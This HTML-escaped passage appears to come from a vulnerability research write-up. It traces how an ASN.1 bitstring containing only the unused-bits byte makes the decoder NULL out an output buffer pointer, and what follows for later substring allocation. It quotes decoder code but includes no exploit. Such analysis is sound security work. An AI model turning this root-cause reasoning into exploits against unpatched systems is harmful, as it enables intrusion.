class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;decodeError&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;return&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;bit_string_unused_bits &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;byte&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;place &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;duringBitString&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;pending &lt;/span&gt;&lt;span class=\"c1\"&gt;-=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;1&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;return&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;1&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;The highlighted region of the function are the characters which were removed by the patch. This function is meant to return the number of input bytes (pointed to by &lt;/span&gt;&lt;span class=\"c7\"&gt;buf&lt;/span&gt;&lt;span&gt;) which it consumed and my initial hunch was to notice that the patch removed a path through this function where you could get the count of input bytes consumed and &lt;/span&gt;&lt;span class=\"c30\"&gt;pending&lt;/span&gt;&lt;span&gt;&amp;nbsp;out-of-sync. It should be the case that when they return 1 in the removed code they also decrement &lt;/span&gt;&lt;span class=\"c30\"&gt;state-&amp;gt;pending&lt;/span&gt;&lt;span class=\"c9\"&gt;, as they do in the other place where this function returns 1.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c9\"&gt;I spent quite a while trying to figure out how you could actually turn that into something useful but in the end I don&amp;#39;t think you can.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c9\"&gt;So what else is going on here?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;This state is reached with &lt;/span&gt;&lt;span class=\"c7\"&gt;buf&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointing to the first byte after the length value of a primitive bitstring. &lt;/span&gt;&lt;span class=\"c7\"&gt;state-&amp;gt;contents_length&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the value of that parsed length. Bitstrings, as discussed earlier, are a unique ASN.1 string type in that they have an extra meta-data byte at the beginning (the unused-bits count byte.) It&amp;#39;s perfectly fine to have a definite zero-length string - indeed that&amp;#39;s (sort-of) handled earlier than this in the &lt;/span&gt;&lt;span class=\"c7\"&gt;prepareForContents&lt;/span&gt;&lt;span&gt;&amp;nbsp;state, which short-circuits straight to &lt;/span&gt;&lt;span class=\"c7\"&gt;afterEndOfContents&lt;/span&gt;&lt;span class=\"c9\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.f2043ae4749f0304b8055ed271eca98bdb5b783d\"&gt;&lt;/a&gt;&lt;a id=\"t.12\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;contents_length &lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(!&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;indefinite&lt;/span&gt;&lt;span class=\"c1\"&gt;))&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c23\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp;* A zero-length simple or constructed string; we are done.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;place &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;afterEndOfContents&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;Here they&amp;#39;re detecting a definite-length string type with a content length of 0. But this doesn&amp;#39;t handle the edge case of a bitstring which consists only of the unused-bits count byte. The &lt;/span&gt;&lt;span class=\"c7\"&gt;state-&amp;gt;contents_length&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;value of that bitstring will be 1, but it doesn&amp;#39;t actually have any &amp;quot;contents&amp;quot;. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;It&amp;#39;s this case which the &lt;/span&gt;&lt;span class=\"c7\"&gt;(state-&amp;gt;contents_length == 1)&lt;/span&gt;&lt;span&gt;&amp;nbsp;conditional in &lt;/span&gt;&lt;span class=\"c7\"&gt;sec_asn1d_parse_bit_string&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;matches:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.cc85cec956c682ae2159b3e2792de03dfdc37f3c\"&gt;&lt;/a&gt;&lt;a id=\"t.13\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;((&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;pending &lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;||&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;contents_length &lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;1&lt;/span&gt;&lt;span class=\"c1\"&gt;))&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;dest &lt;/span&gt;&lt;span class=\"c1\"&gt;!=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c20\"&gt;SecAsn1Item&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;item &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c20\"&gt;SecAsn1Item&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*)(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;dest&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; item&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c20\"&gt;Data&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; item&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c20\"&gt;Length&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;place &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;beforeEndOfContents&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;contents_length &lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;1&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c23\"&gt;/* skip over (unused) remainder byte */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;return&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;1&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;else&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;return&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;By setting &lt;/span&gt;&lt;span class=\"c7\"&gt;state-&amp;gt;place&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=\"c7\"&gt;beforeEndOfContents&lt;/span&gt;&lt;span&gt;&amp;nbsp;they are again trying to short-circuit the state machine to skip ahead to the state after the string contents have been consumed. But here they take an additional step which they didn&amp;#39;t take when trying to achieve exactly the same thing in &lt;/span&gt;&lt;span class=\"c7\"&gt;prepareForContents&lt;/span&gt;&lt;span&gt;. In addition to updating &lt;/span&gt;&lt;span class=\"c7\"&gt;state-&amp;gt;place&lt;/span&gt;&lt;span&gt;&amp;nbsp;they also &lt;/span&gt;&lt;span class=\"c7\"&gt;NULL&lt;/span&gt;&lt;span&gt;&amp;nbsp;out the &lt;/span&gt;&lt;span class=\"c7\"&gt;dest&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c7\"&gt;SecAsn1Item&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class=\"c7\"&gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;field and set the &lt;/span&gt;&lt;span class=\"c7\"&gt;Length&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=\"c7\"&gt;0&lt;/span&gt;&lt;span class=\"c9\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;I mentioned earlier that the new child states which are allocated to recursively parse the sub-strings of constructed strings get a &lt;/span&gt;&lt;span class=\"c17\"&gt;copy&lt;/span&gt;&lt;span&gt;&amp;nbsp;of the parent&amp;#39;s dest field (which is a pointer to a pointer to the output buffer.) This makes sense: that output buffer is only allocated once then gets recursively filled-in in a linear fashion by the children. (Technically this isn&amp;#39;t actually how it works if the outermost string is indefinite length, there&amp;#39;s separate handling for that case which instead builds a linked-list of substrings which are eventually concatenated, see &lt;/span&gt;&lt;span class=\"c7\"&gt;sec_asn1d_concat_substrings&lt;/span&gt;&lt;span class=\"c9\"&gt;.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;If the output buffer is only allocated once, what happens if you set &lt;/span&gt;&lt;span class=\"c7\"&gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=\"c7\"&gt;NULL&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;like they do here? Taking a step back, does that actually make any sense at all?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;No, I don&amp;#39;t think it makes any sense. Setting &lt;/span&gt;&lt;span class=\"c7\"&gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=\"c7\"&gt;NULL&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;at this point should at the very least cause a memory leak, as it&amp;#39;s the only pointer to the output buffer.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;The fun part though is that that&amp;#39;s not the only consequence of &lt;/span&gt;&lt;span class=\"c7\"&gt;NULL&lt;/span&gt;&lt;span&gt;ing out that pointer. &lt;/span&gt;&lt;span class=\"c7\"&gt;item-&amp;gt;Data&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;is used to signal something else.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;Here&amp;#39;s a snippet from &lt;/span&gt;&lt;span class=\"c7\"&gt;prepare_for_contents&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;when it&amp;#39;s determining whether there&amp;#39;s enough space in the output buffer for this substring&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.d41f98cf14153779bd60c5cf6b4f85e93e5bdb90\"&gt;&lt;/a&gt;&lt;a id=\"t.14\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;else&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;substring&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c23\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp;* If we are a substring of a constructed string, then we may&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp;* not have to allocate anything (because our parent, the&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp;* actual constructed string, did it for us). &amp;nbsp;If we are a&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp;* substring and we *do* have to allocate, that means our&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp;* parent is an indefinite-length, so we allocate from our pool;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp;* later our parent will copy our string into the aggregated&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp;* whole and free our pool allocation.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;item&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c20\"&gt;Data&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; PORT_Assert &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;item&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c20\"&gt;Length&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; poolp &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;top&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;our_pool&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;else&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; alloc_len &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;As 